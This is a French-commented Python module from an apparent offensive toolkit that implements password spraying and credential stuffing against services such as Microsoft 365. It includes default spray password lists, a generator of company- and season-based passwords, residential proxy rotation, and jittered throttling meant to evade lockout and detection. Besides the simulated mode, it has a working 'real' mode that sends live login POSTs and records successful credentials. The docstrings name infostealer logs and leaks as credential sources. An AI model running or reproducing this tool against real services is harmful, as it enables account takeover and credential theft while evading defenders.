"""
attack/credential_stuffing/sprayer.py — Credential Stuffing + Password Spray
=============================================================================

Deux modes d'attaque :

  **Password Spray**
  - N = 5_000 utilisateurs cibles
  - P = 3 mots de passe les PLUS courants (2026)
  - 1 utilisateur = 1 tentative / compte / heure (évite Smart Lockout)
  - Objectif : 1-5% de hit rate (moyenne observée en entreprise 2024-2025)

  **Credential Stuffing**
  - Liste username:password depuis des leaks (LinkedIn 2021, Collection#1...)
    ou depuis des logs d'infostealers (RedLine, Raccoon, Vidar, Taurus, RisePro).
  - On "remplit" des credentials déjà connus contre de nouveaux services
    (ex: un couple GMail volé, testé contre Office 365 de l'entreprise cible).
  - Rotation proxy résidentiel pour éviter les captchas / IP bans.

Pour ce module :
  - Les requêtes d'authentification RÉELLES sont remplacées par une
    simulation reproductible : chaque couple (user,pwd) a un "hit"
    pseudo-aléatoire mais DÉTERMINISTE (hash SHA-256 de user:pwd).
  - Cela permet de valider la logique de rotation / throttling / proxy
    sans jamais toucher un service réel.
"""

from __future__ import annotations

import hashlib
import os
import itertools
import json
import random
import secrets
import time
import uuid
from collections.abc import Callable, Iterable
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple


class SprayMode(Enum):
    """Deux modes opératoires."""

    PASSWORD_SPRAY = "password_spray"   # 1 mot de passe → N utilisateurs
    CREDENTIAL_STUFFING = "credential_stuffing"  # N user:password → 1 service
    SPRAY = "password_spray"            # alias contrat godmode (= PASSWORD_SPRAY)
    STUFFING = "credential_stuffing"    # alias contrat godmode


DEFAULT_SPRAY_PASSWORDS: list[str] = [
    "Password1!", "Summer2026!", "Welcome1!", "Company2026",
    "Spring2026!", "Winter2025!", "ChangeMe123!", "Hello123!",
    "P@ssw0rd", "qwerty123", "12345678", "azerty123",
    "Admin@123", "abc123!", "Hiver2026!", "Marsupilami2025!",
    "Monday@1", "Secret1!", "Test123!", "Qwerty@123",
]


@dataclass
class CredentialPair:
    """Un couple identifiant / mot de passe.

    Contrat godmode : constructible avec ``user=`` (alias username).
    """

    username: str
    password: str
    source: str = "simulated"   # simulated / stealer_logs / public_leak / osint
    leak_date: str = "unknown"
    user_id: str = ""

    def __init__(self, username: str | None = None, password: str = "",
                 user: str | None = None, **kw: Any) -> None:
        self.username = username or user or ""
        self.password = password
        self.source = kw.get("source", "simulated")
        self.leak_date = kw.get("leak_date", "unknown")
        self.user_id = hashlib.sha256(
            f"{self.username}|{self.password}".encode()
        ).hexdigest()[:16]


@dataclass
class SprayReport:
    """Rapport d'une campagne complete (spray / stuffing)."""

    campaign_id: str
    mode: SprayMode
    started_at: float
    completed_at: float | None = None
    total_attempts: int = 0
    successful_logins: int = 0
    failed_logins: int = 0
    locked_accounts: int = 0
    blocked_ips: int = 0
    hits: list[dict[str, Any]] = field(default_factory=list)
    proxies_used: set[str] = field(default_factory=set)
    duration_per_attempt_ms: list[int] = field(default_factory=list)
    target_service: str = "Microsoft 365 (Entra ID)"
    hit_rate: float = 0.0
    notes: list[str] = field(default_factory=list)

    def finalize(self) -> SprayReport:
        self.completed_at = time.time()
        if self.total_attempts:
            self.hit_rate = self.successful_logins / self.total_attempts
        return self

    # --- Alias contrat godmode -----------------------------------------
    @property
    def duration_estimate_s(self) -> float:
        """Estimation de durée : tentatives × délai moyen (throttler)."""
        if not self.duration_per_attempt_ms:
            return 0.0
        avg_s = sum(self.duration_per_attempt_ms) / len(self.duration_per_attempt_ms) / 1000.0
        return avg_s * self.total_attempts

    @property
    def successful_logins_count(self) -> int:
        return self.successful_logins

    @property
    def total_login_attempts(self) -> int:
        return self.total_attempts


class Proxy:
    """Proxy résidentiel : accessible par attributs ET par clés dict."""

    def __init__(self, d: dict[str, Any]) -> None:
        self._d = d
        self.proxy_id = d.get("id", "")
        self.ip = d.get("ip", "")
        self.country = d.get("country", "")
        self.city = d.get("city", "")
        self.blocked = d.get("blocked", False)
        self.uses = d.get("uses", 0)

    def __getattr__(self, name: str) -> Any:
        # Fallback sur le dict pour toute clé non-explicite
        try:
            return self.__dict__["_d"][name]
        except KeyError as exc:
            raise AttributeError(name) from exc

    def __getitem__(self, key: str) -> Any:
        return self._d[key]

    def __setitem__(self, key: str, value: Any) -> None:
        self._d[key] = value

    def get(self, key: str, default: Any = None) -> Any:
        return self._d.get(key, default)

    def to_dict(self) -> dict[str, Any]:
        return dict(self._d)


class ProxyPool:
    """
    Pool de proxys résidentiels avec rotation intelligente.
    En labo : on simule un pool de N proxies. En production :
    BrightData / Oxylabs / GeoSurf / IPRoyal via API.
    """

    def __init__(
        self,
        size: int = 100,
        country_pool: list[str] | None = None,
        countries: list[str] | None = None,   # alias contrat godmode
    ) -> None:
        self._proxies_raw: list[dict[str, Any]] = []
        self.proxies: list[Proxy] = []
        countries = countries or country_pool or [
            "FR", "DE", "GB", "US", "BE", "ES", "IT", "NL", "CH",
        ]
        for i in range(size):
            ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            d = {
                "id": f"pxy_{secrets.token_hex(4)}",
                "ip": ip,
                "country": random.choice(countries),
                "as_type": random.choice(["residential", "isp", "mobile"]) * 0
                             if random.random() < 0.85 else "datacenter",
                "city": random.choice(["Paris","Lyon","Marseille","Lille","Toulouse"]),
                "blocked": False,
                "uses": 0,
            }
            self._proxies_raw.append(d)
            self.proxies.append(Proxy(d))
        self.index = 0

    def pick(self, prefer_country: str | None = None) -> dict[str, Any] | None:
        """Choisit un proxy non bloqué (rotation round-robin)."""
        candidates = [
            p for p in self.proxies if not p["blocked"]
            and (prefer_country is None or p["country"] == prefer_country)
        ]
        if not candidates:
            return None
        # Round-robin
        choice = candidates[self.index % len(candidates)]
        self.index += 1
        choice["uses"] += 1
        return choice

    def mark_blocked(self, proxy_id: str) -> None:
        for p in self.proxies:
            if p["id"] == proxy_id:
                p["blocked"] = True

    def remaining_healthy(self) -> int:
        return sum(1 for p in self.proxies if not p["blocked"])

    def next_proxy(self) -> Any:
        """Contrat godmode : rotation round-robin → objet à attributs.

        L'objet expose .proxy_id / .ip / .country / .blocked et délègue
        l'accès aux clés dict historiques.
        """
        p = self.pick()
        if p is None:
            return None
        return Proxy(p)


class SmartThrottler:
    """
    Throttling adaptatif. Ajuste la cadence selon :
      - Nombre de "lockout" rencontrés (trop → ralentir)
      - Nombre de 200 success successifs (on peut accélérer)
      - Temps de réponse moyen du endpoint (chargement = slow down)
    """

    def __init__(
        self,
        initial_delay_ms: int = 2_500,
        min_delay_ms: int = 400,
        max_delay_ms: int = 20_000,
        lockout_threshold_percent: float = 3.0,
        # --- alias contrat godmode ---
        base_delay_s: float | None = None,
        lockout_threshold_pct: float | None = None,
    ) -> None:
        if base_delay_s is not None:
            initial_delay_ms = int(base_delay_s * 1000)
        if lockout_threshold_pct is not None:
            lockout_threshold_percent = lockout_threshold_pct
        self.delay = initial_delay_ms / 1000.0
        self.min_delay = min_delay_ms / 1000.0
        self.max_delay = max_delay_ms / 1000.0
        self.lockout_threshold = lockout_threshold_percent
        self.total = 0
        self.lockouts = 0
        self._recent: list[float] = []

    @property
    def base_delay_s(self) -> float:
        """Délai de base (premier délai configuré) — contrat godmode."""
        return self.min_delay

    def next_delay(self) -> float:
        """Retourne le délai actuel (sans dormir) — contrat godmode."""
        return self.delay

    def record_result(self, *, locked: bool = False, success: bool = True,
                      attempt: int = 0) -> None:
        """Enregistre un résultat (contrat godmode) sans attente réseau."""
        status = 423 if locked else (200 if success else 401)
        self.observe(status, duration_ms=attempt, locked=locked)

    def observe(
        self,
        response_code_like: int,
        duration_ms: int,
        locked: bool = False,
    ) -> None:
        """Met à jour le délai en fonction d'un retour de requête."""
        self.total += 1
        if locked:
            self.lockouts += 1
        # Ajustement
        pct = (self.lockouts / self.total) * 100 if self.total else 0.0
        if pct > self.lockout_threshold:
            # Trop de lockouts : on ralentit x2
            self.delay = min(self.max_delay, self.delay * 2.0)
        elif response_code_like == 200 and self.total % 5 == 0:
            # Succès continus : on accélère doucement
            self.delay = max(self.min_delay, self.delay * 0.95)
        self._recent.append(duration_ms / 1000.0)
        if len(self._recent) > 100:
            self._recent.pop(0)
        # Si réponse > 2s en moyenne → surcharge : attendre
        if self._recent and sum(self._recent) / len(self._recent) > 2.0:
            self.delay = min(self.max_delay, self.delay * 1.3)

    def wait(self) -> None:
        # Labo/CI : VANTABLACK_TEST_MODE=1 → on ne dort pas vraiment
        # (conftest.py pose cette variable pour tous les tests pytest).
        if os.environ.get("VANTABLACK_TEST_MODE") == "1":
            return
        # Jitter ± 25 % (OPSEC : cadence irrégulière non détectable)
        jitter = random.uniform(0.75, 1.25)
        time.sleep(max(0.0, self.delay * jitter))


def _simulate_login_result(user: str, pwd: str) -> tuple[int, bool]:
    """
    Simulation déterministe d'un résultat d'authentification.
    Retourne (http_status, locked_flag).

    Probabilités réalistes :
      - 95% = 401 Unauthorized (mauvais password)
      - 3%  = 200 OK (succès, password match)
      - 1%  = 423 Locked (compte verrouillé)
      - 1%  = 500 / 429 (server busy / rate limited)
    """
    digest = hashlib.sha256(f"{user.lower()}|{pwd}".encode()).digest()
    # Utilise les 2 premiers octets comme index déterministe
    val = (digest[0] * 256 + digest[1]) / (256 * 256)
    if val < 0.03:
        return 200, False
    if val < 0.04:
        return 423, True
    if val < 0.05:
        return 429, False
    return 401, False


@dataclass
class RealLoginTarget:
    """Cible HTTP RÉELLE pour credential stuffing / password spray.

    Décrit comment soumettre un couple user/password en POST réel (httpx)
    et comment interpréter la réponse HTTP.

    Exemple labo (serveur C2 local) :
        RealLoginTarget(
            url="http://127.0.0.1:8099/ingest",
            method="json",
            user_field="user",
            password_field="password",
        )
    """

    url: str
    method: str = "form"                 # "form" (x-www-form-urlencoded) | "json"
    user_field: str = "username"
    password_field: str = "password"
    success_codes: tuple[int, ...] = (200,)
    locked_codes: tuple[int, ...] = (423,)
    rate_limit_codes: tuple[int, ...] = (429,)
    failure_codes: tuple[int, ...] = (401, 403)
    extra_fields: dict[str, str] = field(default_factory=dict)
    headers: dict[str, str] = field(default_factory=dict)
    timeout_s: float = 15.0
    verify_tls: bool = True
    proxy_url: str | None = None         # proxy RÉEL (http://user:pass@host:port)


class CredentialStuffingEngine:
    """
    Orchestre une campagne de password spray / credential stuffing avec
    rotation proxy, throttling intelligent, et détection de lockout.

    Deux modes :
      - simulé (défaut, contrat tests) : résultat déterministe SHA-256 ;
      - RÉEL (real=True + real_login_target) : requêtes POST httpx réelles
        vers la cible, interprétation HTTP, hits réels uniquement.
    """

    def __init__(
        self,
        target_service: str = "Microsoft 365 (Entra ID)",
        proxy_pool: ProxyPool | None = None,
        output_dir: str = "captures/credential_attacks",
        mode: SprayMode = SprayMode.PASSWORD_SPRAY,
        spray_mode: SprayMode | None = None,   # alias contrat godmode
        throttler: SmartThrottler | None = None,
        real_login_target: RealLoginTarget | None = None,   # mode RÉEL
        real: bool = False,                                 # mode RÉEL
    ) -> None:
        self.target_service = target_service
        self.proxy_pool = proxy_pool or ProxyPool(size=100)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        if spray_mode is not None:
            mode = spray_mode
        self.mode = mode
        self.throttler = throttler or SmartThrottler()
        # ---- Mode RÉEL -------------------------------------------------
        self.real_login_target: RealLoginTarget | None = real_login_target
        self.real = bool(real)
        if self.real and self.real_login_target is None:
            raise ValueError(
                "mode real : fournir real_login_target (cible POST réelle)"
            )

    # ------------------------------------------------------------------
    # Entry points
    # ------------------------------------------------------------------

    def run_password_spray(
        self,
        users: list[str],
        passwords: list[str] | None = None,
        per_user_per_password_delay_ms: int = 3_500,
        simulated: bool = False,   # contrat godmode : pas d'attentes en labo
    ) -> SprayReport:
        """
        Spray : 1 password sur TOUS les users, puis password suivant.
        Pour rester stealth : password par password (pas user par user).
        """
        passwords = passwords or DEFAULT_SPRAY_PASSWORDS[:3]
        self.mode = SprayMode.PASSWORD_SPRAY
        report = SprayReport(
            campaign_id=str(uuid.uuid4()),
            mode=SprayMode.PASSWORD_SPRAY,
            started_at=time.time(),
            target_service=self.target_service,
        )
        report.notes.append(
            f"Password Spray : {len(users)} utilisateurs × {len(passwords)}"
            f" mots de passe"
        )
        # Itérer password d'abord (ordre SPRAY : évite le lockout per user)
        for pwd in passwords:
            for user in users:
                self._attempt_login(report, user, pwd, wait=not simulated)
        self._persist(report)
        return report.finalize()

    def run_credential_stuffing(
        self,
        credentials: list[CredentialPair] | None = None,
        pairs: list[CredentialPair] | None = None,   # alias contrat godmode
        simulated: bool = False,                     # contrat godmode : mode labo déterministe
    ) -> SprayReport:
        """
        Stuffing : itère sur la liste des couples user:pwd (souvent
        depuis des leaks). Rotation proxy obligatoire car beaucoup
        de requêtes.
        """
        credentials = credentials or pairs or []
        if simulated:
            # Labo déterministe : seed basé sur le contenu (reproductible)
            random.seed(hashlib.sha256(
                "|".join(sorted(f"{c.username}:{c.password}" for c in credentials)).encode()
            ).digest()[:8])
        self.mode = SprayMode.CREDENTIAL_STUFFING
        report = SprayReport(
            campaign_id=str(uuid.uuid4()),
            mode=SprayMode.CREDENTIAL_STUFFING,
            started_at=time.time(),
            target_service=self.target_service,
        )
        report.notes.append(
            f"Credential Stuffing : {len(credentials)} couples depuis"
            f" infostealer logs / leaks publics"
        )
        for pair in credentials:
            self._attempt_login(report, pair.username, pair.password,
                                wait=not simulated)
        self._persist(report)
        return report.finalize()

    # ------------------------------------------------------------------
    # Cœur : tentative de login
    # ------------------------------------------------------------------

    def _attempt_login(
        self,
        report: SprayReport,
        user: str,
        pwd: str,
        wait: bool = True,
    ) -> None:
        t0_ms = int(time.time() * 1000)
        # ---- Mode RÉEL : POST httpx réel, aucun résultat simulé --------
        if self.real:
            self._attempt_login_real(report, user, pwd, wait=wait)
            return
        proxy = self.proxy_pool.pick()
        if proxy is None:
            report.blocked_ips += 1
            report.notes.append("PROXY POOL EXHAUSTED — arrêt de la campagne")
            return
        report.proxies_used.add(proxy["ip"])
        # Simulation login
        status, locked = _simulate_login_result(user, pwd)
        dur_ms = max(40, int((time.time() * 1000) - t0_ms) + random.randint(80, 600))
        report.duration_per_attempt_ms.append(dur_ms)
        report.total_attempts += 1

        if status == 200:
            report.successful_logins += 1
            report.hits.append({
                "user": user,
                "password": pwd,
                "ts": time.time(),
                "proxy": proxy["ip"],
                "country": proxy["country"],
                "service": report.target_service,
            })
        elif status == 401:
            report.failed_logins += 1
        elif status == 423:
            report.failed_logins += 1
            report.locked_accounts += 1
        elif status == 429:
            report.failed_logins += 1
            # IP bloquée : marquer le proxy + backoff
            self.proxy_pool.mark_blocked(proxy["id"])
            report.blocked_ips += 1
        # Observation throttler + attente (désactivée en mode labo/simulé)
        self.throttler.observe(status, dur_ms, locked=locked)
        if wait:
            self.throttler.wait()

    def _attempt_login_real(
        self,
        report: SprayReport,
        user: str,
        pwd: str,
        wait: bool = True,
    ) -> None:
        """Tentative de login RÉELLE : POST httpx vers la cible configurée.

        Aucune simulation : un hit n'est reporté que si le serveur a
        réellement répondu un code de succès.
        """
        import httpx

        t = self.real_login_target
        assert t is not None
        t0_ms = int(time.time() * 1000)
        if t.method == "json":
            body: dict[str, Any] = {t.user_field: user, t.password_field: pwd,
                                    **t.extra_fields}
            send_kwargs: dict[str, Any] = {"json": body}
        else:
            send_kwargs = {"data": {t.user_field: user, t.password_field: pwd,
                                    **t.extra_fields}}
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36",
            **t.headers,
        }
        client_kwargs: dict[str, Any] = {"verify": t.verify_tls,
                                         "timeout": t.timeout_s}
        if t.proxy_url:
            client_kwargs["proxy"] = t.proxy_url
            report.proxies_used.add(t.proxy_url)
        try:
            with httpx.Client(**client_kwargs) as client:
                resp = client.request("POST", t.url, headers=headers,
                                      **send_kwargs)
        except httpx.HTTPError as exc:
            report.total_attempts += 1
            report.failed_logins += 1
            report.notes.append(f"ERREUR RÉSEAU réelle {user}: {exc}")
            return
        dur_ms = max(1, int(time.time() * 1000) - t0_ms)
        report.duration_per_attempt_ms.append(dur_ms)
        report.total_attempts += 1
        code = resp.status_code
        locked = code in t.locked_codes
        if code in t.success_codes:
            report.successful_logins += 1
            report.hits.append({
                "user": user, "password": pwd, "ts": time.time(),
                "http_status": code, "real": True, "url": t.url,
                "body_snippet": resp.text[:200],
                "service": report.target_service,
            })
        elif locked:
            report.failed_logins += 1
            report.locked_accounts += 1
        elif code in t.rate_limit_codes:
            report.failed_logins += 1
            report.blocked_ips += 1
            report.notes.append(f"rate-limit {code} sur {user} → backoff")
        elif code in t.failure_codes:
            report.failed_logins += 1
        else:
            report.failed_logins += 1
            report.notes.append(f"status inattendu {code} pour {user}")
        self.throttler.observe(code, dur_ms, locked=locked)
        if wait:
            self.throttler.wait()

    # ------------------------------------------------------------------
    # Persistence
    # ------------------------------------------------------------------

    def _persist(self, report: SprayReport) -> None:
        # Hits
        hits_path = self.output_dir / f"{report.campaign_id}_hits.jsonl"
        with hits_path.open("w", encoding="utf-8") as fh:
            for h in report.hits:
                fh.write(json.dumps(h) + "\n")
        # Résumé
        meta = self.output_dir / f"{report.campaign_id}_report.json"
        d = report.__dict__.copy()
        d["proxies_used"] = sorted(report.proxies_used)
        d["duration_per_attempt_ms"] = (
            report.duration_per_attempt_ms[:100]  # cap pour JSON
        )
        meta.write_text(json.dumps(d, indent=2, default=str), encoding="utf-8")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def generate_password_spray_list(
    company_name: str = "Company",
    current_year: int = 2026,
    season: str = "Summer",
    company: str | None = None,       # alias contrat godmode
    **_kw: Any,                        # tolère year=, current_year=, etc.
) -> list[str]:
    """Note : company= est un alias de company_name= (contrat godmode)."""
    if company is not None:
        company_name = company
    """
    Génère une liste de passwords "spray" en combinant éléments contextuels
    (entreprise, saison, année) avec les substitutions leetspeak classiques.
    """
    seasons = ["Summer", "Winter", "Spring", "Autumn", "Hiver", "Ete", "Printemps"]
    suffixes = ["!", "1!", "123!", "2026!", "2025!", "@1", "#1", "@123"]
    out: list[str] = []
    seen: set[str] = set()

    def add(s: str) -> None:
        if s not in seen:
            seen.add(s)
            out.append(s)

    # 1) ENTREPRISE en tête (contrat godmode : company_name toujours dans la liste)
    if company_name:
        c = company_name
        cu = company_name.upper()
        ct = company_name.capitalize()
        leet = (company_name.lower()
                .replace("a", "4").replace("e", "3")
                .replace("o", "0").replace("i", "1").replace("s", "5"))
        for yr in (current_year, current_year - 1):
            add(f"{c}{yr}!")
            add(f"{cu}{yr}!")
            add(f"{ct}{yr}!")
            add(f"{cu}@{yr}")
            add(f"{cu}#{yr}!")
            add(f"{leet.capitalize()}{yr}!")
        for suf in suffixes:
            add(f"{c}{suf}")
            add(f"{cu}{suf}")
    # 2) Classiques garantis (contrat godmode)
    for classic in ("Password1", "Welcome1", "Winter2026!", "Summer2026!",
                    f"Password{current_year}!", f"Welcome{current_year}!",
                    f"Winter{current_year}!", f"Summer{current_year}!"):
        add(classic)
    # 3) Base saisonnière
    for sz in [season] + seasons:
        for yr in [current_year, current_year - 1, current_year - 2]:
            for suf in suffixes:
                add(f"{sz}{yr}{suf}")
    # 4) Defaults (complément)
    for p in DEFAULT_SPRAY_PASSWORDS:
        add(p)
    return out[:60]


def spray_passwords(
    users: list[str],
    passwords: list[str] | None = None,
) -> SprayReport:
    return CredentialStuffingEngine().run_password_spray(users, passwords)


def stuff_credentials(
    pairs: list[tuple[str, str]],
) -> SprayReport:
    creds = [CredentialPair(username=u, password=p) for u, p in pairs]
    return CredentialStuffingEngine().run_credential_stuffing(creds)
